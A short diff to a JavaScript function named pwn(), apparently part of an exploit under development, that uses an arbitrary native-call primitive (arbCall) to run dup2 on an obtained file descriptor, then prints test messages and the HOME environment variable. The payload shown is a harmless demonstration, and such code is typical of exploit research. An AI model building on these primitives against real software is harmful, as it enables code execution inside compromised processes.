@@ -409,5 +409,18 @@ function pwn() {
     }
     
     log(`[+] fd: ${fd}`);
-    write(fd, "Hello, World!", 13);
+    
+    const STDOUT_FILENO = 1;
+    
+    let dup2ret = arbCall("dup2", fd, STDOUT_FILENO);
+    log(dup2ret.toString(16));
+    
+    function stdoutLog(message) {
+        log(message);
+        write(STDOUT_FILENO, message, message.length);
+        write(STDOUT_FILENO, "\n", 1);
+    }
+    
+    stdoutLog("Hello, World!");
+    stdoutLog(`[+] HOME: ${getenv("HOME")}`);
 }
